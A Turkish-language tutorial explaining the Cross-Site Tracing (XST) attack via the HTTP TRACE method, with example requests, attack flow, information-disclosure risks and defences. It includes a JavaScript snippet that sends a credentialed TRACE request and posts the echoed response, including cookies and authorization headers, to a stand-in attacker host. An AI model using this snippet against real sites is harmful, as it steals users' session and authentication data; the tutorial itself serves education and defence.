# XST
TRACE HTTP metodunun kötüye kullanılmasıyla ortaya çıkan bir güvenlik zafiyetidir. TRACE metodu, gönderilen HTTP isteğini aynen geri döndürür. Saldırgan bu özelliği kullanarak, hedef kullanıcının hassas bilgilerini çalabilir. Normal XSS saldırısında JavaScript kodu direkt olarak sayfada çalışır. XST’de ise TRACE metodunun geri dönen isteğini kötüye kullanarak hassas veriler çalınır.

# HTTP TRACE Metodu Nedir
HTTP TRACE, bir istemcinin yaptığı isteğin, hedef sunucu tarafından değişmeden geri gönderilmesini sağlar. Yani, istemciden gelen HTTP isteği sunucu tarafından alınıp, aynen yanıtın içerisinde döndürülür. İstemci ile sunucu arasındaki HTTP isteğinin aracı katmanlar (proxy, firewall, load balancer vs.) tarafından değiştirilip değiştirilmediğini test etmek için kullanılır.

Örnek HTTP TRACE isteği:
```http
TRACE /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

Sunucunun yanıtı:
```html
HTTP/1.1 200 OK
Content-Type: message/http

TRACE /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
```

# Saldırının İşleyişi
XST saldırısında, saldırgan genellikle hedef web sitesine TRACE isteği gönderen JavaScript kodunu kurbanın tarayıcısında çalıştırır. JavaScript üzerinden XMLHttpRequest veya fetch API ile HTTP TRACE metodunu kullanarak isteği tetikler. 

Örnek kötü amaçlı JavaScript:
```javascript
var xhr = new XMLHttpRequest();
xhr.open('TRACE', 'https://example.com.com/', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://saldirgansite.com/steal', {
    method: 'POST',
    body: xhr.responseText
  });
};
xhr.send();
```

Bu istek içinde genellikle:
- Cookie header'ı.
- Authorization header'ı (JWT, Basic Auth).
- Diğer hassas header’lar (CSRF token vb.),

Tek başına XST, doğrudan sunucudan zararlı kod yerleştirmez, sadece TRACE metodunun varlığından faydalanır.

# TRACE ile Information Disclosure Mantığı
TRACE metodunun olayı zaten isteğin olduğu gibi geri dönmesi. Sunucunun yanıt gövdesinde senin gönderdiğin tüm HTTP header’lar döner. Bu header’ların içinde bazen:
- Proxy veya load balancer eklediği iç IP adresleri (X-Forwarded-For, Via gibi)
- İç ağ hostname bilgileri
- Versiyon bilgileri (Apache, Nginx, Tomcat versiyonu)

Gibi aslında dışarıya verilmemesi gereken bilgiler yer alabilir.

# XST Saldırısından Korunmak
## Sunucu Tarafında XST Saldırısından Korunmak
HTTP/1.1 standardında TRACE metodu diagnostik amaçlı tanımlanmıştır. Ancak modern uygulamalarda gereksiz olduğu halde bazı sunucularda (özellikle default config’te) kapatılmaz. 

## İstemci Tarafında XST Saldırısından Korunmak
Normalde tarayıcılar TRACE gibi bazı metodlara JavaScript üzerinden erişimi kısıtlar.
Ancak iki senaryo zafiyeti mümkün kılar:
- XSS zafiyeti: Saldırgan hedef sitede script çalıştırabildiğinde TRACE isteğini doğrudan o domain üzerinden gönderebilir (Same-Origin Policy engel olmaz).
- Yanlış yapılandırılmış CORS: Hedef sunucu Access-Control-Allow-Origin: * ve Access-Control-Allow-Credentials: true gibi zayıf CORS ayarlarıyla TRACE yanıtını farklı origin’den okunabilir hale getirirse, saldırgan kendi domain’inden bile veri çekebilir.

Referanslar:
- https://datatracker.ietf.org/doc/html/rfc7231#section-4.3.8
- https://owasp.org/www-community/attacks/Cross_Site_Tracing
- 